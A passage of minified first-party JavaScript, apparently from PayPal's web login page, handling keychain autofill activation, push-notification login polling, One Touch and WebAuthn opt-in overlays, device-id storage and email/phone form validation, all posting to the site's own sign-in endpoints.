s&&$(s).addClass("hide"),o&&$(o).addClass("hide"),r&&$(r).addClass("hide"),a.innerHTML=e,$("body").append(a),i&&$(i).addClass("hide"),u.log({evt:t,data:"PREPARE_INTERSTITIAL",calEvent:!0}),u.log({evt:"state_name",data:"keychain_interstitial",instrument:!0}),u.log({evt:"transition_name",data:"prepare_keychain_interstitial",instrument:!0}),u.pushLogs()}function m(e,n,r){var i=(n=n||{}).returnUrl,s=n.email,a=n.rdstr;return function(f){return eventPreventDefault(f),o.showSpinner(),u.log({evt:t,data:"PROCESS_INTERSTITIAL_"+e.toUpperCase(),calEvent:!0}),u.log({evt:"state_name",data:"keychain_interstitial",instrument:!0}),u.log({evt:"transition_name",data:"process_keychain_interstitial",instrument:!0}),u.log({evt:"actionType",data:e,instrument:!0}),u.pushLogs(),r?function c(e){var t=g(),n=Object.assign({},t,e);return o.makeServerRequestAndReturnPromise("/signin/keychain/handle/token",{method:"POST",data:n})}({email:s,rdstr:a}).then((function(t){var n=(t=t||{}).keychainDeviceToken;return n?h(i,n,s).click():Promise.reject({message:"no-device-token"})})).catch((function(n){var r=(n=n||{}).message||"",s=n.responseText||"";if("no-device-token"===r)u.log({evt:t,data:"FAILED_CREATE_TOKEN_NO_TOKEN",calEvent:!0});else if(s.includes("CSRF token missing"))u.log({evt:t,data:"FAILED_CREATE_TOKEN_CSRF",calEvent:!0});else{var o=JSON.stringify(n);u.log({evt:t,data:"FAILED_CREATE_TOKEN_"+o,calEvent:!0})}return u.pushLogs(),window.location.href=i})):window.location.href=i}}function g(){return{ctxId:o.getCtxId(),intent:o.getIntent(),returnUri:o.getReturnUri(),state:o.getReturnUriState(),flowId:o.getFlowId()}}var t="KEYCHAIN",r={EIGHTBALL:"signin",CHECKOUT:"checkout",DONATE:"donate",CONNECT:"connect",RISKY_LOGIN:"risky_login",UNKNOWN:"unknown"},i={PPOT:"ppot_token",EMAIL:"email_token",PD103:"pd103_token"},s=/^\S+@\S+\.\S+$/,o=login.utils,u=login.logger;return a.triggerOptin=function(t){t.isXHR?d(t.htmlDOM,t.returnUrl):p(),function v(e){e=e||{};var t=document.querySelector("#keychain-interstitial"),n=t.querySelector(".decline"),r=t.querySelector(".cta-decline"),i=t.querySelector("button.cta-keychain-optin");return o.hideSpinnerMessage("checkingInfo"),addEvent(n,"click",m("close_button",e)),addEvent(r,"click",m("do_this_later",e)),addEvent(i,"click",m("next_button",e,!0))}(t)},a.triggerActivation=function(n){var r=g();return u.pushLogs(),function l(e,t){var n=document.querySelector(".transitioning"),r=Object.assign({},e,t);return $(n).addClass("nonTransparentMask"),o.showSpinnerMessage("secureMessage"),o.showSpinnerMessage("keychainOneTouchMessage"),o.makeServerRequestAndReturnPromise("/signin/keychain/handle/authenticate",{method:"POST",data:r})}(r,n).then((function(n){return n.isCookieDisabledRequest&&n.accessToken&&n.returnUrl?(u.log({evt:t,data:"PROCESS_SLR_INTERNAL_REDIRECT",calEvent:!0}),u.pushLogs(),o.handleSlrInternalRedirect(n)):n.returnUrl?window.location.href=n.returnUrl:Promise.reject()})).catch((function(){return o.hideSpinner(),o.hideSpinnerMessage("secureMessage"),o.hideSpinnerMessage("keychainOneTouchMessage"),a.showErrorMessage({isFailed:!0})}))},a.loginWithKeychainToken=function(t){t=t||{};var n=document.querySelector(".transitioning"),s=document.querySelector("form[name=login]"),a=s&&s.querySelector("#btnNext"),f=s&&s.querySelector("button#btnLogin");return t.flowName===r.RISKY_LOGIN&&t.tokenType===i.EMAIL?(f&&f.click(),u.pushLogs()):t.tokenType===i.PPOT?(function y(e){var t=document.querySelector(".textInputMask.email"),n=t&&t.querySelector(".maskDisplay"),r=t&&t.querySelector(".maskChange"),i=document.querySelector("input#email");t&&($(t).removeClass("hide"),$(t).addClass("maskEnabled"),$(t).addClass("transformRightToLeft"),$(n).text(e),r.addEventListener("click",(function(){$(t).addClass("hide"),$(t).removeClass("maskEnabled"),$(n).text(""),i.value=""})))}(t.email),o.addHiddenElementIfNotExist("ppot_login_email",t.email,s),a&&a.click(),u.pushLogs()):t.tokenType===i.EMAIL?(n&&$(n).addClass("nonTransparentMask"),o.addHiddenElementIfNotExist("isKeychainActivationWithEmailTokenOn8ball","true",s),f&&f.click(),u.pushLogs()):u.pushLogs()},a.getTokenInfo=function(t,r){var o=t&&"PayPal One Touch"===t,u="string"==typeof r&&r.split("-1:")||[],a="string"==typeof u[1]&&u[1].match(s),f=u[1],l={};return o&&a?(l.tokenType=i.PPOT,l.email=f,l.token=r,l):!o&&a?(l.tokenType=i.EMAIL,l.email=f,l.token=r,l):o?(l.tokenType=i.PD103,l.token=r,l):void 0},a.showErrorMessage=function(t){t=t||{};var n=document.querySelector("#keychainErrorMessage");if(n){if($(n).removeClass("hide"),t.isFailed){var i=n.querySelector(".keychain-activation-failure");return i&&$(i).removeClass("hide")}if(t.flowName===r.RISKY_LOGIN){var s=n.querySelector(".blocked-on-risky-login");return s&&$(s).removeClass("hide")}if(t.flowName===r.EIGHTBALL||t.flowName===r.CONNECT){var o=n.querySelector(".blocked-on-8ball");return o&&$(o).removeClass("hide")}}},a.mapAutofillToKeychainActivationEvent=function(n,r,i){var s=document.querySelector("input#email"),o=document.querySelector("input#password");if(s&&o&&r)return e({isIosWebView:n,emailInputDOM:s,pwdInputDOM:o,callback:function u(){var e=s.value,t=o.value,n=a.getTokenInfo(e,t);if(n){f(n.tokenType,i)&&(window.formAutofilledAt=Date.now());var u=createNewEvent("keychain:activation");return u.tokenType=n.tokenType,u.email=n.email,u.token=n.token,r.dispatchEvent(u)}}})},a.getFlowName=function(){return"true"===$("body").data("isRiskyLogin")?r.RISKY_LOGIN:o.getIntent()||r.UNKNOWN},a.shouldBlockActivation=function(t,n,s){return t===r.EIGHTBALL||t===r.CONNECT||t===r.RISKY_LOGIN?n===i.PD103||n===i.PPOT:(t===r.CHECKOUT||t===r.DONATE)&&!s},a.shouldAllowLoginWithKeychain=function(t,n){return(t===r.RISKY_LOGIN||t===r.EIGHTBALL||t===r.CONNECT||t===r.CHECKOUT||t===r.DONATE)&&n===i.EMAIL},a.shouldAllowOneTouchLoginWithKeychain=function(t,n){return(t===r.CHECKOUT||t===r.DONATE)&&n},a.blockActivation=function(n,r){return r=r||"",n=n||"",a.showErrorMessage({flowName:n}),u.log({evt:t,data:"ACTIVATION_BLOCKED_"+n.toUpperCase()+"_"+r.toUpperCase(),calEvent:!0}),u.log({evt:"notification",data:"keychain_not_allowed",instrument:!0}),u.pushLogs()},a}(initializeKeychainAutofillDetector);login.keychain=function(e){var t="KEYCHAIN",n=login.utils,r=login.logger,i=n.parseJsonSafe($("body").data("keychainFlagsJson"))||{},s=i.activationOnXoEnabled,o=i.isIosWebView,u=i.isEligibleForXhrLogin;return function(a){a=a||{};var f=$("body"),l=document.querySelector("form[name=login]"),c=document.querySelector("input#email"),h=l&&l.querySelector("input#password"),p=a.isKeychainOptinRequired||f.data("isKeychainOptinRequired"),d=a.keychainReturnUrl||f.data("keychainReturnUrl"),v=parseInt(a.keychainOptinTime||f.data("keychainOptinTime")),m=a.keychainUiExp||f.data("keychainUiExp"),g=e.getFlowName();if(p)return e.triggerOptin({returnUrl:d,optinTime:v,uiExp:m,isXHR:u,htmlDOM:a.keychainHtml,email:a.email,rdstr:a.rdstr});e.mapAutofillToKeychainActivationEvent(o,l,g),l&&addEvent(l,"keychain:activation",(function(u){u.preventDefault();var a=u.tokenType,f=u.email,p=u.token;return n.addHiddenElementIfNotExist("isFormAutofilled","true",l),r.log({evt:"keychain_type",data:a,instrument:!0}),r.log({evt:t,data:"TOKEN_TYPE_"+a.toUpperCase(),calEvent:!0}),e.shouldBlockActivation(g,a,s)?(c.value="",h.value="",e.blockActivation(g,a)):e.shouldAllowLoginWithKeychain(g,a)?e.loginWithKeychainToken({tokenType:a,email:f}):e.shouldAllowOneTouchLoginWithKeychain(g,s)?(h.value="",e.triggerActivation({deviceToken:p,isIosWebView:o})):(c.value="",h.value="",r.log({evt:t,data:"UNEXPECTED_FLOW_OR_INTENT",calEvent:!0}),r.pushLogs())}))}}(Keychain),login.verification=function(){function A(e){login.utils.updateView({splitLoginContext:"inputPassword",profile:{email:h},verification:null,notifications:e.notifications})}function O(){var e,t=document.querySelector("#expired .slimP");t&&t.textContent&&(e={msg:t&&t.textContent,type:"notification-warning"}),login.utils.updateView({splitLoginContext:"inputPassword",profile:{email:h},tpdVariant:N,verification:null,ulSync:_("inputPassword"),notifications:e})}function _(e){var n=-1!==(PAYPAL.ulSync&&PAYPAL.ulSync.sourceId||"").indexOf("REMEMBERED")?"_REMEMBERED":"";return{sourceId:{inputPassword:"UNIFIED_LOGIN_INPUT_PASSWORD"}[e]+n}}function D(){var e=login.storeInstance.getState().model.rememberProfile,t={_csrf:o.value,intent:"completeLogin",accessToken:l,"locale.x":u.value,rememberProfile:"true"===e||!0===e,login_email:h,flowId:login.utils.getFlowId(),tpdVariant:N,tpdTriggerMethod:k},n=function M(){if(PAYPAL.syncData&&"object"==typeof PAYPAL.syncData.data)return JSON.stringify(PAYPAL.syncData.data)}();n&&(t.fn_sync_data=n),login.utils.getCtxId()&&(t.ctxId=login.utils.getCtxId()),$.ajax({url:"/signin/challenge/push?intent="+login.utils.getIntent(),type:"POST",data:t,success:function(e){return e&&"LoggedIn"===e.pollStatus&&e.returnUrl?window.location.href=e.returnUrl:e&&"Failed"===e.pollStatus?A(e):(O(),void login.tpdLogin.instrumentTpdExpired("NO_RESPONSE"))}})}function P(){if(f)return t>=e?(O(),void login.tpdLogin.instrumentTpdExpired("NO_ACTION")):(t++,void(a=$.ajax({url:"/signin/challenge/push",type:"POST",data:{_csrf:o.value,intent:"poll",accessToken:l,authflowDocumentId:c,retryCount:t,"locale.x":u.value,flowId:login.utils.getFlowId(),tpdVariant:N,tpdTriggerMethod:k},success:L,fail:function(){f&&P()}})))}function B(e){var r,n=document.querySelector("form[name=login]");f=!0,l=(e=e||{}).accessToken||l,c=e.authflowDocumentId||c,h=e.email||h,t=0,N=e.variant||N,k=e.tpdTriggerMethod||k,P(),(r=document.querySelector("[name=authdocId]"))?r.setAttribute("value",c):login.utils.addHiddenElement("authdocId",c,n)}function I(e){var t=getEventTarget(e),n=$(t).data("reason");e.preventDefault(),$(w).addClass("hide"),$(w).removeClass("greyOut"),q(),login.tpdLogin.instrumentUsePasswordInstead(n),p&&$(p).addClass("hide"),T&&$(T).removeClass("hide")}function q(){f=!1,a&&a.abort()}var a,l,c,h,N,C,k,e=9,t=0,n=5e3,r=3e3,i=3,s=0,o=document.querySelector("input[name=_csrf]"),u=document.querySelector('input[name="locale.x"]'),f=!1,p=document.querySelector("#verification"),d=document.querySelector(".verificationSubSection"),m=(document.querySelector("#expired"),document.querySelector("#denied")),g=document.querySelector("#expiredTryAgainButton"),y=document.querySelector("#pendingNotYouLink"),b=document.querySelector("#pending #tryPasswordLink"),w=document.querySelector("#resend"),E=document.querySelector(".sentMessage"),S=document.querySelector("#passwordInsteadDropDown"),x=document.querySelector("#passwordInsteadGroup"),T=document.querySelector("#login"),L=function(e){switch(e||P(),o.value=e._csrf||o.value,e.pollStatus){case"Accepted":q(),(C=!C&&"Accepted"===e.pollStatus)&&(login.logger.log({evt:"TPD_CLIENT",data:"Approved_"+e.tpdTriggerMethod,calEvent:!0}),login.logger.pushLogs()),D();break;case"Downgraded":P();break;case"Denied":q(),$(d).addClass("hide"),$(m).removeClass("hide");break;case"Failed":q(),A(e);break;default:e.errorView?(O(),login.tpdLogin.instrumentTpdExpired("RCS_SERVICE_ERROR")):P()}};return g&&(g.onclick=function j(){window.location.href=window.location.href}),y&&(y.onclick=function(e){q(),login.tpdLogin.instrumentNotYouClicked(),login.utils.notYouClickHandler(e)}),login.pubsub&&login.pubsub.subscribe("WINDOW_CLICK",(function F(e){var t=getEventTarget(e);S&&($(t).hasClass("showSurvey")||$(S).addClass("hide"))})),b&&$(b).hasClass("showSurvey")?(addEvent(b,"click",(function H(e){e.preventDefault(),$(S).removeClass("hide")})),addEvent(x,"click",I)):b&&addEvent(b,"click",I),addEvent(w,"click",(function U(e){e.preventDefault(),$(e.target).hasClass("greyOut")||(login.tpdLogin.instrumentResendClicked(),q(),t=0,$(w).addClass("greyOut"),s++,$.ajax({url:"/signin/challenge/push",type:"POST",data:{_csrf:o.value,intent:"resend",accessToken:l,authflowDocumentId:c,"locale.x":u.value,flowId:login.utils.getFlowId(),tpdVariant:N,tpdTriggerMethod:k},success:function(t){if(t&&"Success"===t.resendStatus)return B({accessToken:l,authflowDocumentId:c,email:h}),$(w).addClass("hide"),$(E).removeClass("hide"),void setTimeout((function(){$(E).addClass("hide"),s<i&&($(w).removeClass("hide"),$(w).removeClass("greyOut"))}),r);t&&t.notifications&&login.view.updateNotificationView(t)},fail:function(){}}))})),{startPolling:B,showResendLink:function R(){s=0,setTimeout((function(){$(w).removeClass("hide")}),n)},updateView:function z(e){var s,t=document.querySelector("#moreOptionsContainer"),n=document.querySelector("#tpdButtonContainer"),r=document.querySelector('input[name="tpdEligible"]'),i=document.querySelector("form[name=login]"),o=document.querySelector("#btnNext");if(e&&n&&t)if((e.tpdVariant||e.tpdAutoSend)&&(r?r.value="true":((s=document.createElement("input")).setAttribute("type","hidden"),s.setAttribute("name","tpdEligible"),s.setAttribute("value","true"),$(i).append(s))),"moreOptions"===e.tpdVariant&&($(t).removeClass("hide"),$(".forgotLink").addClass("hide")),"tpdButton"===e.tpdVariant&&($(t).addClass("hide"),$(n).removeClass("hide"),$(".forgotLink").removeClass("hide"),$("#signupContainer").addClass("hide")),e.tpdAutoSend&&(login.tpdLogin&&login.tpdLogin.instrumentTpdLoginAutoTriggered(),login.tpdLogin&&login.tpdLogin.attemptTpdLogin("autoSend")),"inputEmail"===e.splitLoginContext&&($(t).addClass("hide"),$(n).addClass("hide"),r&&"true"===r.value&&(r.value="")),login.utils.isTpdDemo()&&"inputEmail"!==e.splitLoginContext){var u=document.querySelector("#splitPassword");o&&$(o).addClass("hide"),u&&$(u).removeClass("hide")}else o&&$(o).removeClass("hide")}}}(),login.overlayUtils=function(){function t(t){eventPreventDefault(t),clearTimeout(e);var u,n=document.getElementById("overlaySpinner"),r=document.getElementById("overlaySpinnerSuccess"),i=$("body").data("return-url")||"/signin";document.getElementById("overlayOptIn").disabled=!0,$(r).removeClass("hide"),$(n).addClass("hide"),setTimeout((function(){s()}),1300),$.ajax({type:"POST",url:"/signin/provisionCapabilities/oneTouch",data:{flowId:login.utils.getFlowId(),optInSource:"signin"===login.utils.getIntent()?"overlay_dl":"overlay_xo",_csrf:document.querySelector("#token").value},dataType:"json",complete:function(){u=setInterval((function(){if($(overlayMask).hasClass("hide"))return clearInterval(u),login.logger.log({evt:"ONETOUCH",data:"REDIRECT_AFTER_ACTIVATION_RESPONSE_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs(),window.location.href=i}),100)}}),login.logger.log({evt:"flow_type",data:"onetouch",instrument:!0}),login.logger.log({evt:"actiontype",data:"turn_on",instrument:!0}),login.logger.log({evt:"state_name",data:"overlay",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_overlay",instrument:!0}),login.logger.log({evt:"ONETOUCH",data:"CLICK_OPT_IN_BUTTON_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs(),setTimeout((function(){return login.logger.log({evt:"ONETOUCH",data:"REDIRECT_WITHOUT_ACTIVATION_RESPONSE_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs(),clearInterval(u),window.location.href=i}),1e4)}function n(t){function o(e){e=e||0,setTimeout((function(){window.location.href=i||"/signin"}),e)}eventPreventDefault(t),clearTimeout(e);var n={evt:"state_name",data:"FINGERPRINT_OPTIN",instrument:!0},r="WEBAUTH_N_CLIENT",i=$("body").data("return-url");login.logger.log({evt:"flow_type",data:"webauthn",instrument:!0}),login.logger.log({evt:"actiontype",data:"turn_on",instrument:!0}),login.logger.log({evt:"state_name",data:"overlay",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_overlay",instrument:!0}),login.logger.log({evt:"WEBAUTH_N_CLIENT",data:"PROCESS_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs(),s(),login.webAuthnOptInXHR().then((function(){login.logger.clientLog([n,{evt:"transition_name",data:"process_consent_XHR",instrument:!0},{evt:r,data:"BIND_SUCCESS_XHR_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0}],(function(){return o()}))})).catch((function(){login.logger.clientLog([n,{evt:"transition_name",data:"process_error_XHR",instrument:!0},{evt:r,data:"BIND_FAIL_XHR_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0,status:"ERROR"}],(function(){return o()}))}))}function r(e){return"oneTouch"===$("body").data("overlay-variant")?t(e):"webAuthn"===$("body").data("overlay-variant")?n(e):void 0}function i(){login.logger.log({evt:"actiontype",data:"close_button",instrument:!0}),login.logger.log({evt:"flow_type",data:$("body").data("overlay-variant").toLowerCase(),instrument:!0}),login.logger.log({evt:"state_name",data:"overlay",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_overlay",instrument:!0}),login.logger.log({evt:l(),data:"CLICK_CLOSE_BUTTON_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs();var e=$("body").data("return-url"),t=document.getElementById("overlayContainer"),n=document.getElementById("overlayMask");$(t).removeClass("overlaySlideDown"),$(t).addClass("overlaySlideUp"),setTimeout((function(){return $(n).addClass("hide"),window.location.href=e||"/signin"}),250)}function s(){var e=document.getElementById("overlayContainer"),t=document.getElementById("overlayMask");$(e).removeClass("overlaySlideDown"),$(e).addClass("overlaySlideUp"),setTimeout((function(){$(t).addClass("hide")}),250)}function o(){eventPreventDefault(event),clearTimeout(e);var t=document.getElementById("overlayExpandDetails"),n=document.getElementById("overlayCollapseDetails"),r=document.getElementById("overlayDetails");$(t).toggle(),$(n).toggle(),$(r).hasClass("overlaySlideUp")?($(r).removeClass("overlaySlideUp"),$(r).addClass("overlaySlideDown")):($(r).removeClass("overlaySlideDown"),$(r).addClass("overlaySlideUp"))}function l(){var t="";switch($("body").data("overlay-variant")||"unknown"){case"webAuthn":t="WEBAUTH_N_CLIENT";break;case"oneTouch":t="ONETOUCH";break;default:t="UNIFIED_LOGIN"}return t}var e;return{showOverlay:function u(t){var n=document.getElementById("overlayOptIn"),s=document.getElementById("overlayExpandDetails"),u=document.getElementById("overlayCollapseDetails"),a=document.getElementById("overlayClose"),f=$("body").data("return-url"),c=t&&t.closeOverlayTimeoutValue;if(n.onclick=r,a.onclick=i,s.onclick=o,u.onclick=o,!n.onclick||!a.onclick)return window.location.href=f||"/signin";var h=document.getElementById("email"),p=document.getElementById("password");h&&h.blur(),p&&p.blur();var d=document.getElementById("overlayContainer"),v=document.getElementById("overlayMask");$(v).removeClass("hide"),$(d).removeClass("overlaySlideUp"),$(d).addClass("overlaySlideDown"),login.logger.log({evt:"flow_type",data:$("body").data("overlay-variant").toLowerCase(),instrument:!0}),login.logger.log({evt:"state_name",data:"overlay",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_overlay",instrument:!0}),login.logger.log({evt:l(),data:"SHOWN_SUCCESSFULLY_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs(),a.focus(),c&&(e=setTimeout((function(){login.logger.log({evt:"flow_type",data:$("body").data("overlay-variant").toLowerCase(),instrument:!0}),login.logger.log({evt:"state_name",data:"overlay",instrument:!0}),login.logger.log({evt:"transition_name",data:"timeout_close_overlay",instrument:!0}),login.logger.log({evt:l(),data:"TIMEOUT_CLOSE_OVERLAY_AND_REDIRECT_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs();var e=document.getElementById("overlayContainer"),t=document.getElementById("overlayMask");$(e).removeClass("overlaySlideDown"),$(e).addClass("overlaySlideUp"),setTimeout((function(){return $(t).addClass("hide"),window.location.href=f||"/signin"}),250)}),c))},isEligibleToShowOverlay:function a(e){var n="oneTouch"===($("body").data("overlay-variant")||"unknown")&&e&&e.oneTouchOverlayPostOptinEligible,r=!!document.getElementById("overlay");return n&&!r&&(login.logger.log({evt:l(),data:"NOT_SHOWN_SINCE_TEMPLATE_NOT_LOADED_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs()),n&&r},isLoginXHREligbleForOverlay:function f(){var e=$("body").data("overlay-variant")||"unknown";return("webAuthn"===e||"oneTouch"===e)&&(login.logger.log({evt:l(),data:"XHR_LOGIN_ELIGIBLE_OVERLAY_"+login.utils.getIntent().toUpperCase(),calEvent:!0}),login.logger.pushLogs(),!0)}}}(),login.core=function(){function e(){try{var t=window.performance.getEntriesByType("navigation")[0];const n=Math.round(t.domInteractive)||0,r={t12:n,fetchStart:Math.round(t.fetchStart),domComplete:Math.round(t.domComplete),redirectStart:Math.round(t.redirectStart),unloadEventEnd:Math.round(t.unloadEventEnd),domContentLoadedEventEnd:Math.round(t.domContentLoadedEventEnd),loadEventStart:Math.round(t.loadEventStart)};return login.logger.log({evt:"INFO",data:"CUSTOMCPLMETRICS",calPayload:JSON.stringify(r),calEvent:!0}),login.logger.pushLogs(),n}catch(i){return Math.round(window.performance?window.performance.now():0)}}return window.addEventListener("load",(function(){if(window.PAYPAL&&window.trackLazyData){var t=window.PAYPAL||{},n=t.ulData||{},r=t.analytics||{},i=(n.sourceId||"").indexOf("WEBLLS");r.instance&&i<0&&r.instance.setLazyData("UnifiedLoginNodeWeb",{t12:e()})}})),function(){function nt(e,t){e.put({index:"d_id",value:Q}).onsuccess=function(){$.ajax({url:"/signin/client-log",method:"POST",data:{did_set:!0,_csrf:document.querySelector("#token").value},success:function(e){login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_set_success_"+t,instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_set_success_"+t,calEvent:!0}),login.logger.pushLogs()},fail:function(){login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_set_failed_"+t,instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_set_failed_"+t,calEvent:!0}),login.logger.pushLogs()}})}}function ot(e){if(!c||"inputPassword"!==c.value||F){var t=c&&"inputEmail"===c.value;!F&&t&&"phone"===kt&&(kt="email"),login.utils.doesItLookLikeEmail(e)?"email"!==kt&&(!F&&c.setAttribute("value","inputEmail"),kt="email",$(C)&&$(C).addClass("hide"),$(s.container).removeClass("phoneInputWrapper")):(f.field.value=e,"phone"!==kt&&(!F&&c.setAttribute("value","inputPhone"),kt="phone",$(C).removeClass("hide"),$(s.container).addClass("phoneInputWrapper")))}}function ut(){f.field.value=null,s.field.value=null,o&&$(o).addClass("hide");var e=login.storeInstance.getState().model,t=e&&e.contextualLogin&&e.contextualLogin.content&&e.contextualLogin.content.emailOrPhoneLabel;$(s.field).attr("placeholder",t),$(s.label).text(t),s.field.removeAttribute("data-hybrid-in-email-only-mode")}function at(e){var t=getEventTarget(e),n=s.field&&"true"===$(s.field).attr("data-hybrid-in-email-only-mode");n&&"email"!==kt&&(kt="email"),t&&!n&&(login.pubsub.publish("CLEAR_OTP_LOGIN_CONTEXT"),ot(t.value))}function Lt(e){if(e&&"string"==typeof e)return e.replace(mt,"")}function At(e){return!e.field||(!!Lt(e.field.value)||(Ht(e),Bt(e),!1))}function Ot(e){var t=e&&e.field&&e.field.value;return!(e&&e.field&&!e.field.hasAttribute("disabled"))||(t?!(!(t=t&&t.replace(Et,""))||t.match(yt))||(Ht(e),jt(e),It(e),!1):(Ht(e),Bt(e),qt(e),!1))}function Mt(e){var t=e&&e.field&&Lt(e.field.value);return!!(e&&e.field&&e.field.hasAttribute("disabled"))||(t?t===wt||(!t||!t.match(bt)||(Ht(e),jt(e),!1)):(Ht(e),Bt(e),!1))}function _t(e,t){var i=!0,s=login.utils.getActiveCaptchaElement(c);return!!At(e)&&(!!At(t)&&(s&&s.field&&(i=At(s)),!!i))}function Dt(e){return"inputEmail"===e.value?document.querySelector("#rememberProfileEmail"):"inputPassword"===e.value?document.querySelector("#rememberProfilePassword"):void 0}function Pt(e){var t=e.field.value.replace(mt,"");return t===wt||(!(!t.match(gt)&&!e.field.hasAttribute("disabled"))||(Ht(e),jt(e),!1))}function Ht(e){$(e.container).addClass("hasError"),e.container.style["z-index"]=100,$(e.errMsgContainer).addClass("show"),e.field.focus()}function Bt(e){$(e.errMsg).removeClass("hide")}function jt(e){$(e.invalidMsg).removeClass("hide")}function Ft(e,t){t&&$(e.container).removeClass("hasError"),e.container.style["z-index"]=1,$(e.errMsgContainer).removeClass("show")}function It(e){$(e.errMsg).addClass("hide")}function qt(e){$(e.invalidMsg).addClass("hide")}function Rt(){var e,t=/\&passwordRecoveryByPhoneEnabled\=true/;if(_)for(var n=0;n<_.length;n++)e=_[n].getAttribute("href").replace(t,""),_[n].setAttribute("href",e);D&&D.setAttribute("data-src",D.getAttribute("data-src").replace(t,""))}function zt(){var e=document.querySelector('input[name="splitLoginContext"]'),t=document.querySelector('input[name="splitLoginCookiedFallback"]');$(g).removeClass("hide"),$(y).addClass("hide"),L&&$(L).addClass("hide"),s.field&&s.field.removeAttribute("disabled"),u.field&&u.field.removeAttribute("disabled"),a.field&&a.field.setAttribute("disabled","disabled"),f.field&&f.field.setAttribute("disabled","disabled"),l.field&&l.field.setAttribute("disabled","disabled"),Nt||$(M).removeClass("hide"),T&&$(T).addClass("hide"),$(m).removeClass("phonePresent"),kt="email",e&&(A&&$(A).removeClass("hide"),e.value="inputEmail",t&&(e.value="inputPassword"))}function Qt(e){var t="true"===$("body").data("enableSuppressAutoSubmit"),n=Date.now()-window.formAutofilledAt,r=parseInt($("body").data("suppressAutosubmitTime"))>=n,s=document.querySelector('input[name="isKeychainActivationWithEmailTokenOn8ball"]');if(document.querySelector("#continueInterstitial"))eventPreventDefault(e);else{if(t&&n&&(login.logger.log({evt:"AUTOSUBMIT",data:"PREPARE_SUPPRESS_"+n,calEvent:!0}),login.logger.pushLogs(),r))return eventPreventDefault(e),void delete window.formAutofilledAt;var u=document.querySelector("input[name=splitLoginContext]"),a=document.querySelector("input[name=splitLoginCookiedFallback]"),f=u&&u.value||"";a||s?an(e):"inputEmail"===f||"inputPhone"===f||login.utils.isPrefilledEmailNext()||login.utils.isPrefillEmailEnabled()?Yt(e):an(e)}}function Gt(e){var t=function st(e){if(!a)return e;var t=a.container.querySelector(".phoneCode"),n=t&&$(t).text();return 0===e.lastIndexOf(n,0)?e.substr(n.length):e}(e);f.field.value=t,s.field.value=t}function Yt(e){var t,n=login.utils.getSplitLoginContext(),i="safari"===$("body").data("loginExperience"),o=$("body").data("hybridLoginInputEmailOnly"),u=login.utils.isFieldPrefilled(document.querySelector("#password")),a=i&&u,l=document.getElementById("btnNext");if(login.utils.isPrefillEmailEnabled()&&"inputEmail"!==n.value&&login.utils.isTpdDemo())return eventPreventDefault(e),login.tpdLogin&&login.tpdLogin.attemptTpdLogin("autoSend");j?("phone"===kt&&s.field&&Gt(s.field.value),t="email"===kt?Mt(s):Ot(s)):t="email"===kt?Mt(s):Ot(f),t&&login.utils.beaverLogger({transition_name:"email"===kt?"submit_email":"submit_phone",status:"success",isRedirect:!0,state:"start"});var h=document.querySelectorAll("form[name=login] input"),p={};p.isSafariAutofill=a;var g,y,b,d=login.utils.getActiveCaptchaElement(c),v=Dt(c),m=$("body").data("splitPasswordClientTransition"),E=document.querySelector("#phoneCode"),S=document.querySelector("form[name=login]");if(St=!0,eventPreventDefault(e),t&&$(s.field).hasClass("validate")&&"inputEmail"===n&&(t=Pt(s)),t&&d&&d.field&&(t=At(d)),t&&("inputEmail"===n||"inputPhone"===n)&&(login.logger.log({evt:"state_name",data:login.logger.getStateName(),instrument:!0}),login.logger.log({evt:"transition_name",data:"process_next",instrument:!0}),login.logger.pushLogs()),o&&"inputEmail"!==n&&(t=Pt(s)),t&&(login.utils.showSpinner(),login.fn.addFnSyncData(),!l||!l.hasAttribute("submit"))){if(l&&l.setAttribute("submit","true"),("phonePassword"===kt||"phone"===kt)&&function Ut(){var e;if(_)for(var t=0;t<_.length;t++)e=_[t].getAttribute("href")+"&passwordRecoveryByPhoneEnabled=true",_[t].setAttribute("href",e);D&&D.setAttribute("data-src",D.getAttribute("data-src")+"&passwordRecoveryByPhoneEnabled=true")}(),r&&$(r).text(""),m&&("phone"===kt||"phonePassword"===kt))return y=(g=document.querySelector("#phone"))&&g.value.replace(Et,""),b=(b=document.querySelector("#phoneCode"))&&b.value.replace(/[A-Z\s]/gi,""),g.value=y,login.storeInstance.updateModel({splitLoginContext:Ct?"inputPin":"inputPassword",profile:{phone:y,phoneCode:b}}),login.logger.log({evt:"state_name",data:"begin_phone",instrument:!0}),login.logger.log({evt:"transition_name",data:Ct?"prepare_pin":"prepare_pwd",instrument:!0}),login.logger.pushLogs(),login.utils.hideSpinner(),void login.utils.setSliderToPasswordContainer();if(m&&"email"===kt)return login.storeInstance.updateModel({splitLoginContext:"inputPassword",profile:{email:s&&s.field&&s.field.value},rememberProfile:v&&v.checked}),login.utils.hideSpinner(),void login.utils.setSliderToPasswordContainer();for(var x=0;x<h.length;x++)p[h[x].name]=h[x].value;delete p.login_password,delete p.login_pin,"inputPhone"===p.splitLoginContext&&E&&(p.phoneCode=E.value,delete p.login_email),"inputEmail"===p.splitLoginContext&&(delete p.login_phone,delete 